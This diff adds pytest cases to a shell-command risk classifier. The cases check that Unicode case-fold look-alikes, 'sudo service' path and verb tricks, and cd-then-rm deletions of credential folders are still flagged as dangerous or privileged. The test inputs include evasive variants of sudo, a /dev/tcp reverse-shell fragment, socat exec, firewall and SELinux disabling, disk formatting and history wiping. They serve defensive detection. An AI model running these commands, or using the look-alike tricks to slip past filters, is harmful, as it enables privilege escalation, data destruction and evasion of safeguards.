@@ -622,3 +622,114 @@ def test_safe_path_accepts_literal_paths(path):
 ])
 def test_rm_with_non_literal_path_chars_is_not_lowered(command):
     assert _sev(command, DANGEROUS) == CRIT
+
+
+# --- final review: Unicode literal gates, service verbs, linear cd/rm check ---
+# Python's IGNORECASE also matches U+017F (long s) to s, U+212A (Kelvin sign)
+# to k, and U+0130/U+0131 (dotted/dotless I) to i. develop flags these; the
+# literal gates must not drop them.
+
+_UNICODE = [
+    "\u017fudo bash", "\u017fu - root", "vi\u017fudo", "\u017fetenforce 0",
+    "hi\u017ftory -c", "p\u212aexec bash", "m\u212afs.ext4 /dev/sda", "/bin/\u017fh -i",
+    "ufw di\u017fable", "\u017focat - EXEC:sh", "chmod +\u017f x", "\u017fetcap x",
+    "ufw d\u0131sable", "ufw d\u0130sable", "/bin/sh -\u0131",
+    "rm -rf ~/\u017f", "\u017fystemctl start x", "iptable\u017f -F",
+    "rm .ba\u017fh_history", "python \u017focket connect", "bash -\u0131 >& /dev/tcp/1/2",
+    "u\u017feradd x", "\u017fervice x start", "chown \u017fudo",
+    "sudo apt update; \u017fudo bash", "\u017fudo -u root -s", "\u017fudo tee /etc/\u017fudoers",
+    "echo hi; \u017fudo \u017fh",
+]
+
+
+def test_unicode_case_fold_table_is_complete():
+    # every code point re.IGNORECASE matches to an ASCII letter or digit
+    cls = re.compile("[a-z0-9]", re.IGNORECASE)
+    found = {c for c in range(128, 0x110000) if cls.fullmatch(chr(c))}
+    assert found == set(_priv._FOLD)
+
+
+@pytest.mark.parametrize("command", _UNICODE)
+def test_unicode_develop_matches_are_still_matches(command):
+    sigs = _sigs(command)
+    dev_d = bool(_DEV_DANGEROUS.search(command))
+    dev_p = bool(PRIVILEGE_COMMAND_REGEX.search(command))
+    assert dev_d or dev_p, "not a develop match: the case proves nothing"
+    if dev_d:
+        assert DANGEROUS in sigs, "dropped a develop dangerous_command match"
+    if dev_p:
+        assert PRIVILEGE in sigs, "dropped a develop privilege_escalation match"
+
+
+@pytest.mark.parametrize("command", [
+    "\u017fudo bash", "\u017fu - root", "vi\u017fudo", "sudo apt update; \u017fudo bash",
+    "echo hi; \u017fudo \u017fh", "\u017fudo -u root -s",
+])
+def test_unicode_elevators_stay_critical(command):
+    assert _sev(command, PRIVILEGE) == CRIT
+
+
+@pytest.mark.parametrize("command", [
+    "sudo service ../../../tmp/x start", "sudo service /tmp/evil start",
+    "sudo service ./x start", "sudo service x/../../tmp start", "sudo service ../x status",
+    "sudo service /tmp/x status", "sudo service ssh stop", "sudo service ufw stop",
+    "sudo service apparmor stop", "sudo service foo restart", "sudo service foo reload",
+    "sudo service --status-all", "sudo service foo --full-restart",
+    "sudo service x status y", "sudo service", "sudo service x",
+])
+def test_service_paths_and_write_verbs_stay_critical(command):
+    assert _sev(command, PRIVILEGE) == CRIT
+
+
+def test_service_stop_matches_systemctl_stop():
+    assert _sev("sudo service ssh stop", PRIVILEGE) == _sev(
+        "sudo systemctl stop sshd", PRIVILEGE) == CRIT
+
+
+@pytest.mark.parametrize("command", [
+    "sudo service x status", "sudo service nginx status", "sudo service php8.2-fpm status",
+])
+def test_service_status_is_high(command):
+    assert _sev(command, PRIVILEGE) == HIGH
+
+
+def _pairwise_cd_credential(command: str) -> bool:
+    """The old quadratic check, as the oracle for the linear one."""
+    dirs, targets = [], []
+    for segment in _priv._segments(command):
+        words = _priv._safe_words(segment) or []
+        if not words:
+            continue
+        if _priv._prog(words[0]) in ("cd", "pushd"):
+            dirs += words[1:]
+        elif _priv._prog(words[0]) == "rm":
+            targets += [w for w in words[1:] if not w.startswith("-")]
+    return any(_priv._credential(d + "/" + t) for d in dirs for t in targets)
+
+
+@pytest.mark.parametrize("command", [
+    "cd .config && rm -rf ./gcloud", "cd a/.config && rm -rf ./gcloud/x",
+    "cd x.config && rm -rf ./gcloudy", "cd .local && rm -rf ./share/keyrings",
+    "cd .local/share && rm -rf ./keyrings", "cd Library && rm -rf ./Keychains",
+    "cd ./library/ && rm -rf ./keychains", "cd a && cd .config && rm -rf ./b ./gcloud",
+    "cd .config && rm -rf ./gcloud-not", "cd .confi && rm -rf ./g/gcloud",
+    "cd .config/ && rm -rf ./", "cd / && rm -rf ./x", "cd .ssh && rm -rf ./a",
+    "cd a && rm -rf ./.aws", "cd a && rm -rf ./b", "cd .config", "rm -rf ./gcloud",
+    "cd .config/g && rm -rf ./cloud", "cd .CONFIG && rm -rf ./GCloud",
+    "cd .local/sha && rm -rf ./re/keyrings", "cd .lo && rm -rf ./cal/share/keyrings",
+])
+def test_linear_cd_credential_check_matches_pairwise(command):
+    assert _priv._cd_joins_credential(command) == _pairwise_cd_credential(command)
+
+
+@pytest.mark.parametrize("command", [
+    "cd a&&" * 1650 + "rm -rf " + "./b " * 2500,
+    "cd a/.confi&&" * 900 + "rm -rf " + "./b " * 2000,
+    "cd a&&" * 1650 + "rm -rf " + "./b " * 2499 + "./gcloud",
+])
+def test_cd_rm_pairing_is_linear(command):
+    assert len(command) < _priv._CAP
+    analyze_command.cache_clear()
+    t = time.perf_counter()
+    analyze_command(command)
+    assert time.perf_counter() - t < 0.25
